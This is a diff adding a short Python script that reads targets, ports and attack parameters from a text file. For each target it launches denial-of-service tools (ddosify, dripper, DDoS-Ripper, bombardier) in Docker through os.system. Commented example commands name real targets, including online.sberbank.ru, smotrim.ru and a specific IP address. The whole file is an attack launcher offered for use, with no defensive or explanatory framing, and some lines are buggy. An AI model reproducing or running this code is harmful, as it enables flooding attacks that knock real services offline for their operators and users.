@@ -1,0 +1,61 @@
+import os
+
+file_name = "..\\commands\\commands.txt"
+
+file = open(file_name, "r")
+number_of_parameters = 5
+requests = 0
+duration = 0
+timeout = 0
+turbo = 0
+
+targets = []
+
+for i, line in enumerate(file):
+    line = line.replace(' ', '').replace('\n', '')
+    if i < number_of_parameters:
+        if line.startswith("Requests"):
+            requests = line.split(':')[1]
+        elif line.startswith("Duration"):
+            duration = line.split(':')[1]
+        elif line.startswith("Timeout"):
+            timeout = line.split(':')[1]
+        elif line.startswith("Turbo"):
+            turbo = line.split(':')[1]
+    else:
+        current_line = line.split(':')
+        targets.append([current_line[0]])
+        targets.append(current_line[1].split(','))
+
+const_part1 = "docker run "
+
+alpine1 = const_part1 + "-ti --rm alpine/bombardier -c " + requests + " -d " + duration + "s -l "
+
+ddos_ripper1 = const_part1 + "--rm -i --entrypoint python3 nitupkcuf/ddos-ripper:latest -u DRipper.py -s "
+ddos_ripper2 = " -t " + turbo + " -p "
+
+ddosify1 = const_part1 + "-it --rm ddosify/ddosify ddosify -t "
+ddosify2 = " -n " + requests + " -d " + duration + " -p "
+ddosify3 = " -m PUT -T " + timeout
+
+dripper1 = const_part1 + "-it --rm alexmon1989/dripper:1.0.1 -s "
+dripper2 = " -p "
+dripper3 = " -t " + duration
+
+
+# # "docker run -ti --rm alpine/bombardier -c 1000 -d 10800s -l https://online.sberbank.ru/"
+# # "docker run --rm -i --entrypoint python3 nitupkcuf/ddos-ripper:latest -u DRipper.py -s 178.248.233.32 -t 135 -p 80"
+# # "docker run -it --rm ddosify/ddosify ddosify -t smotrim.ru -n 5000 -d 6000 -p HTTPS -m PUT -T 5"
+# # "docker run -it --rm alexmon1989/dripper:1.0.1 -s IP -p PORT NUMBER -t 5000"
+
+
+for i, item in enumerate(targets):
+    if len(item) == 1:
+        for port in targets[++i]:
+            if port == '80':
+                os.system(f"{ddosify1}{item}{ddosify2}HTTP{ddosify3}")
+            elif port == '443':
+                os.system(f"{ddosify1}{item}{ddosify2}HTTP{ddosify3}")
+            else:
+                os.system(f"{dripper1}{item}{dripper2}{port}{dripper3}")
+
